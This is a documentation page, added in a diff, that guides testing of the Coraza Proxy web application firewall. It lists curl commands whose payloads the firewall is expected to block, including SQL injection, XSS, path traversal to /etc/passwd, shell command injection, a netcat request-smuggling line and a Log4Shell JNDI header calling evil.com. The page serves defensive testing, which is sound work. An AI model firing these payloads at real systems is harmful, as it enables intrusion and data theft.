@@ -1,0 +1,589 @@
+---
+title: Security Testing Guide
+description: Comprehensive test cases to validate WAF protection with real attack examples
+---
+
+## Overview
+
+This guide provides real-world test cases to verify that Coraza Proxy correctly detects and blocks common web attacks. All examples use `curl` commands from the project's test suite.
+
+<Warning>
+These tests contain actual attack payloads. Only run them against your own WAF test instance, never against production systems or third-party websites.
+</Warning>
+
+## Prerequisites
+
+Before testing, ensure:
+
+1. Coraza Proxy is running on `localhost:8081`
+2. Add test hostnames to `/etc/hosts`:
+
+```bash
+127.0.0.1 waf.test.local
+127.0.0.1 api.test.local
+```
+
+3. Configure backend:
+
+```bash
+export BACKENDS='{"default": {"default": ["localhost:5000"]}}'
+export PROXY_WEB_HOSTS="waf.test.local"
+export PROXY_APIS_HOSTS="api.test.local"
+```
+
+4. Start the proxy:
+
+```bash
+go build -o ./dist/coraza-proxy main.go
+./dist/coraza-proxy
+```
+
+## SQL Injection Tests
+
+### Test 1: Classic Boolean-Based SQLi
+
+**Attack Type:** SQL Injection using OR condition
+
+**Test Command:**
+```bash
+curl --location --request GET "http://waf.test.local:8081/" \
+  --header 'Host: waf.test.local' \
+  --data-urlencode "id=1' OR '1'='1"
+```
+
+**Expected Result:**
+- **Status Code:** `403 Forbidden`
+- **Response Body:** `Request blocked by WAF (body)` or `Request blocked by WAF (headers)`
+- **Log Entry:** Rule 942xxx triggered (SQL injection)
+
+**Explanation:** The payload `1' OR '1'='1` attempts to manipulate SQL query logic to bypass authentication or extract unauthorized data.
+
+---
+
+### Test 2: UNION-Based SQLi
+
+**Attack Type:** SQL Injection using UNION to extract data from other tables
+
+**Test Command:**
+```bash
+curl --location --request GET "http://waf.test.local:8081/" \
+  --header 'Host: waf.test.local' \
+  --data-urlencode "q=1 UNION SELECT 1,2,3--"
+```
+
+**Expected Result:**
+- **Status Code:** `403 Forbidden`
+- **Response Body:** `Request blocked by WAF`
+- **Triggered Rules:** SQL keyword `UNION`, `SELECT`, and comment `--`
+
+**Explanation:** UNION SELECT allows attackers to retrieve data from different database tables by appending additional SELECT statements.
+
+---
+
+### Test 3: Boolean-Based Blind SQLi
+
+**Attack Type:** Time-based or boolean-based blind SQL injection
+
+**Test Command:**
+```bash
+curl --location --request GET "http://waf.test.local:8081/" \
+  --header 'Host: waf.test.local' \
+  --data-urlencode "q=1 AND 1=1"
+```
+
+**Expected Result:**
+- **Status Code:** `403 Forbidden`
+- **Detection:** SQL operator `AND` with boolean logic
+
+**Explanation:** Boolean-based blind SQLi infers data by observing different application responses to true/false conditions.
+
+---
+
+## Cross-Site Scripting (XSS) Tests
+
+### Test 4: Classic XSS
+
+**Attack Type:** Basic script tag injection
+
+**Test Command:**
+```bash
+curl --location --request GET "http://waf.test.local:8081/" \
+  --header 'Host: waf.test.local' \
+  --data-urlencode "x=<script>alert(1)</script>"
+```
+
+**Expected Result:**
+- **Status Code:** `403 Forbidden`
+- **Response Body:** `Request blocked by WAF`
+- **Triggered Rules:** Rule 941xxx (XSS detection)
+
+**Explanation:** The `<script>` tag can execute arbitrary JavaScript in the victim's browser, leading to session hijacking, data theft, or defacement.
+
+---
+
+### Test 5: Advanced XSS with Event Handler
+
+**Attack Type:** XSS using HTML event handlers
+
+**Test Command:**
+```bash
+curl --location --request GET "http://waf.test.local:8081/" \
+  --header 'Host: waf.test.local' \
+  --data-urlencode "q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E"
+```
+
+**Decoded Payload:** `<img src=x onerror=alert(1)>`
+
+**Expected Result:**
+- **Status Code:** `403 Forbidden`
+- **Detection:** XSS event handler `onerror`, HTML tag `<img>`
+
+**Explanation:** Event handlers like `onerror`, `onload`, `onclick` can execute JavaScript without `<script>` tags, bypassing basic XSS filters.
+
+---
+
+## Path Traversal / Local File Inclusion Tests
+
+### Test 6: Directory Traversal (LFI)
+
+**Attack Type:** Local File Inclusion attempting to read `/etc/passwd`
+
+**Test Command:**
+```bash
+curl --location --request GET "http://waf.test.local:8081/" \
+  --header 'Host: waf.test.local' \
+  --data-urlencode "file=../../etc/passwd"
+```
+
+**Expected Result:**
+- **Status Code:** `403 Forbidden`
+- **Triggered Rules:** Rule 930xxx (Path Traversal)
+- **Detection:** `../` sequences
+
+**Explanation:** Path traversal attacks manipulate file paths to access files outside the intended directory, potentially exposing sensitive system files.
+
+---
+
+## Remote Command Execution Tests
+
+### Test 7: Command Injection
+
+**Attack Type:** Shell command injection using semicolon separator
+
+**Test Command:**
+```bash
+curl --location --request GET "http://waf.test.local:8081/" \
+  --header 'Host: waf.test.local' \
+  --data-urlencode "cmd=;ls -la"
+```
+
+**Expected Result:**
+- **Status Code:** `403 Forbidden`
+- **Triggered Rules:** Rule 932xxx (RCE detection)
+- **Detection:** Shell metacharacter `;` and command `ls`
+
+**Explanation:** Command injection allows attackers to execute arbitrary system commands on the server, leading to complete system compromise.
+
+---
+
+### Test 8: Command Substitution
+
+**Attack Type:** Remote command execution using command substitution
+
+**Test Command:**
+```bash
+curl --location --request GET "http://waf.test.local:8081/" \
+  --header 'Host: waf.test.local' \
+  --data-urlencode "debug=$(cat /etc/passwd)"
+```
+
+**Expected Result:**
+- **Status Code:** `403 Forbidden`
+- **Detection:** Command substitution `$(...)`, `cat` command
+
+**Explanation:** Command substitution `$()` executes commands and injects their output, allowing file reading and command execution.
+
+---
+
+### Test 9: Piped Command Injection
+
+**Attack Type:** Command chaining using pipe operator
+
+**Test Command:**
+```bash
+curl --location --request GET "http://waf.test.local:8081/" \
+  --header 'Host: waf.test.local' \
+  --data-urlencode "calc=1|sleep 5"
+```
+
+**Expected Result:**
+- **Status Code:** `403 Forbidden`
+- **Detection:** Pipe operator `|`, `sleep` command
+
+**Explanation:** Pipe operators chain commands, allowing attackers to execute multiple operations or use time-based detection techniques.
+
+---
+
+## Protocol Attack Tests
+
+### Test 10: Missing Host Header
+
+**Attack Type:** HTTP protocol violation
+
+**Test Command:**
+```bash
+curl --location --request GET "http://waf.test.local:8081/" \
+  --header 'Host: '
+```
+
+**Expected Result:**
+- **Status Code:** `403 Forbidden` or `400 Bad Request`
+- **Triggered Rules:** Rule 920xxx (Protocol enforcement)
+
+**Explanation:** The Host header is mandatory in HTTP/1.1. Missing or empty Host headers can indicate protocol attacks or misconfigured clients.
+
+---
+
+### Test 11: HTTP Request Smuggling
+
+**Attack Type:** HTTP request smuggling using chunked encoding
+
+**Test Command:**
+```bash
+printf "GET / HTTP/1.1\r\nHost: waf.test.local\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n" | nc waf.test.local 8081
+```
+
+**Expected Result:**
+- **Connection:** Terminated or blocked
+- **Detection:** Invalid chunked encoding structure
+
+**Explanation:** Request smuggling exploits differences in how front-end and back-end servers parse HTTP requests, potentially bypassing security controls.
+
+<Note>
+This test requires `netcat` (`nc`) installed. HTTP smuggling is complex and may not always trigger immediate blocking but should be logged.
+</Note>
+
+---
+
+## Encoding Attack Tests
+
+### Test 12: Invalid UTF-8 Encoding
+
+**Attack Type:** Malformed UTF-8 to bypass detection
+
+**Test Command:**
+```bash
+curl --location --request GET "http://waf.test.local:8081/" \
+  --header 'Host: waf.test.local' \
+  --data-urlencode "q=%C0"
+```
+
+**Expected Result:**
+- **Status Code:** `403 Forbidden`
+- **Detection:** Invalid UTF-8 byte sequence
+- **Configuration:** `tx.crs_validate_utf8_encoding=1`
+
+**Explanation:** Invalid UTF-8 sequences can bypass poorly implemented filters. CRS validates all UTF-8 to prevent encoding-based evasion.
+
+---
+
+## API-Specific Tests
+
+### Test 13: XSS in JSON Payload
+
+**Attack Type:** XSS injection in API JSON data
+
+**Test Command:**
+```bash
+curl -v -X POST "http://api.test.local:8081" \
+  -H "Content-Type: application/json" \
+  -d '{"name":"<script>alert(1)</script>"}'
+```
+
+**Expected Result:**
+- **Status Code:** `403 Forbidden`
+- **Response Body:** `Request blocked by WAF (body)`
+- **Detection:** XSS in JSON value
+
+**Explanation:** Even JSON APIs must validate for XSS if response data is rendered in browsers or web views.
+
+---
+
+### Test 14: Header Injection
+
+**Attack Type:** XSS in custom HTTP header
+
+**Test Command:**
+```bash
+curl -v -X POST "http://waf.test.local:8081" \
+  -H "X-Api-Version: <script>" \
+  "http://waf.test.local:8081"
+```
+
+**Expected Result:**
+- **Status Code:** `403 Forbidden`
+- **Detection:** XSS pattern in request header
+
+**Explanation:** Custom headers can be reflected in logs, error pages, or responses. Injecting malicious content into headers can lead to XSS or header injection attacks.
+
+---
+
+## Known Vulnerability Tests
+
+### Test 15: Log4Shell (CVE-2021-44228)
+
+**Attack Type:** JNDI injection via Log4j vulnerability
+
+**Test Command:**
+```bash
+curl --request POST "http://waf.test.local:8081" \
+     -H "Host: waf.test.local" \
+     -H 'User-Agent: ${jndi:ldap://evil.com}' \
+     https://sandbox.coreruleset.org
+```
+
+**Expected Result:**
+- **Status Code:** `403 Forbidden`
+- **Triggered Rules:** Rule 944240 (Log4Shell specific)
+- **Detection:** JNDI injection pattern `${jndi:`
+
+**Explanation:** Log4Shell allowed remote code execution through JNDI lookups in logged data. CRS includes specific rules to detect various obfuscation techniques.
+
+<Warning>
+This test includes a real LDAP URL. Replace `evil.com` with a test domain you control. Never use actual malicious infrastructure.
+</Warning>
+
+---
+
+## Rate Limiting Tests
+
+### Test 16: Rate Limit Bypass Detection
+
+**Attack Type:** Brute force / DoS attempt
+
+**Test Command:**
+```bash
+for i in {1..25}; do 
+  curl -i -s "http://localhost:8081/" -H "Host: waf.test.local" | grep "HTTP/1.1"; 
+done
+```
+
+**Expected Result:**
+- **First 10 requests:** `200 OK` (or backend response)
+- **After burst exhausted:** `429 Too Many Requests`
+- **Rate limit:** 5 req/s with burst of 10 (default)
+
+**Explanation:** Rate limiting prevents brute force attacks and resource exhaustion. Requests exceeding the configured rate are automatically blocked.
+
+---
+
+### Test 17: Rate Limit with Delay
+
+**Attack Type:** Legitimate traffic pattern
+
+**Test Command:**
+```bash
+for i in {1..25}; do 
+  curl -i -s "http://localhost:8081/" -H "Host: waf.test.local" | grep "HTTP/1.1"; 
+  sleep 1;
+done
+```
+
+**Expected Result:**
+- **All requests:** `200 OK` (or backend response)
+- **No rate limiting:** Requests stay within allowed rate
+
+**Explanation:** With 1-second delays, traffic stays below 5 req/s limit, demonstrating that rate limiting doesn't affect normal usage.
+
+---
+
+## Interpreting Test Results
+
+### Successful Block
+
+```
+HTTP/1.1 403 Forbidden
+Date: Wed, 04 Mar 2026 10:30:00 GMT
+Content-Length: 30
+Content-Type: text/plain; charset=utf-8
+
+Request blocked by WAF (body)
+```
+
+**Indicators:**
+- Status code: `403 Forbidden`
+- Response body contains "Request blocked by WAF"
+- Request did NOT reach backend application
+
+### Failed Block (Security Issue)
+
+```
+HTTP/1.1 200 OK
+Date: Wed, 04 Mar 2026 10:30:00 GMT
+Content-Type: text/html
+
+[Backend response with attack payload]
+```
+
+**Indicators:**
+- Status code: `200 OK` or other success code
+- Response from backend application
+- Attack payload was NOT blocked
+
+<Warning>
+If any attack test returns `200 OK` or reaches the backend, your WAF configuration may have issues. Check audit logs and rule configuration immediately.
+</Warning>
+
+### Rate Limiting
+
+```
+HTTP/1.1 429 Too Many Requests
+Date: Wed, 04 Mar 2026 10:30:00 GMT
+Content-Length: 17
+Content-Type: text/plain; charset=utf-8
+
+Too Many Requests
+```
+
+**Indicators:**
+- Status code: `429 Too Many Requests`
+- Response body: "Too Many Requests"
+- IP has exceeded rate limit
+
+## Checking Audit Logs
+
+After running tests, inspect the audit logs for detailed information:
+
+```bash
+tail -f /tmp/log/coraza/audit.log
+```
+
+**Log Entry Example:**
+```
+[2026-03-04 10:30:00] [client 127.0.0.1] 
+Coraza: Access denied with code 403 (phase 2). 
+Pattern match "(?i:(?:union.*select|select.*union))" at ARGS:q. 
+[file "/app/coreruleset/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"] 
+[line "1234"] [id "942270"] 
+[msg "SQL Injection Attack: UNION SELECT"]
+```
+
+**Key Information:**
+- **Rule ID:** 942270
+- **Phase:** Phase 2 (request body)
+- **Pattern:** Union + Select keywords
+- **Location:** ARGS:q (query parameter named 'q')
+- **Action:** Denied with 403
+
+## Customizing Tests for Your Application
+
+### 1. Update Hostnames
+
+Replace `waf.test.local` with your actual test domain:
+
+```bash
+curl "http://your-domain.com/" --data-urlencode "id=1' OR '1'='1"
+```
+
+### 2. Test Specific Endpoints
+
+Test endpoints that accept user input:
+
+```bash
+curl "http://waf.test.local:8081/api/users/search" \
+  --data-urlencode "query=<script>alert(1)</script>"
+```
+
+### 3. Adjust for PL1 vs PL2
+
+**For PL2 APIs**, ensure proper content-type:
+
+```bash
+curl -X POST "http://api.test.local:8081/users" \
+  -H "Content-Type: application/json" \
+  -d '{"id": "1 UNION SELECT 1,2,3--"}'
+```
+
+### 4. Test Authenticated Endpoints
+
+Include authentication headers:
+
+```bash
+curl "http://waf.test.local:8081/admin" \
+  -H "Authorization: Bearer YOUR_TOKEN" \
+  --data-urlencode "cmd=;ls"
+```
+
+## Troubleshooting
+
+### Test Shows 200 OK (Attack Not Blocked)
+
+1. **Check WAF is active:**
+   ```bash
+   curl -v http://waf.test.local:8081/
+   # Look for WAF processing in logs
+   ```
+
+2. **Verify host configuration:**
+   ```bash
+   echo $PROXY_WEB_HOSTS
+   # Should include your test hostname
+   ```
+
+3. **Check CRS rules loaded:**
+   ```bash
+   ls /app/coreruleset/rules/*.conf
+   # Should show multiple rule files
+   ```
+
+4. **Review anomaly thresholds:**
+   - Threshold too high for attack severity
+   - Check `tx.inbound_anomaly_score_threshold` in profile config
+
+### Test Shows 502 Bad Gateway
+
+- **Backend not running:** Start your backend application on configured port
+- **Backend configuration:** Check `BACKENDS` environment variable
+- **Network issues:** Verify backend is accessible from proxy
+
+### Test Shows 429 Too Many Requests
+
+- **Rate limit hit:** Wait 60 seconds for rate limiter cleanup
+- **Adjust limits:**
+  ```bash
+  export PROXY_RATE_LIMIT=100
+  export PROXY_RATE_BURST=200
+  ```
+
+### No Logs Generated
+
+1. **Check log directory permissions:**
+   ```bash
+   ls -la /tmp/log/coraza/
+   chmod 755 /tmp/log/coraza/
+   chmod 644 /tmp/log/coraza/*.log
+   ```
+
+2. **Verify audit logging enabled:**
+   - Check `coraza.conf` for `SecAuditLog` directive
+
+## Best Practices
+
+1. **Run all tests** before deploying to production
+2. **Test both PL1 and PL2** profiles if using both
+3. **Monitor audit logs** during testing to understand rule triggers
+4. **Create custom tests** for your application's specific input fields
+5. **Test after CRS updates** to ensure rules still work correctly
+6. **Document false positives** and create exclusion rules as needed
+7. **Automate testing** using CI/CD pipelines for regression testing
+
+<Note>
+Regular security testing should be part of your development workflow. Run these tests whenever you update WAF rules, CRS versions, or make significant application changes.
+</Note>
+
+## Next Steps
+
+- Review [Protection Levels](/security/protection-levels) to understand PL1 vs PL2
+- Read [Attack Detection](/security/attack-detection) for detailed detection mechanisms
+- Configure [custom rule exclusions](https://coreruleset.org/docs/concepts/false_positives_tuning/) for false positives
+- Set up [monitoring and alerting](https://coreruleset.org/docs/concepts/monitoring/) for blocked requests
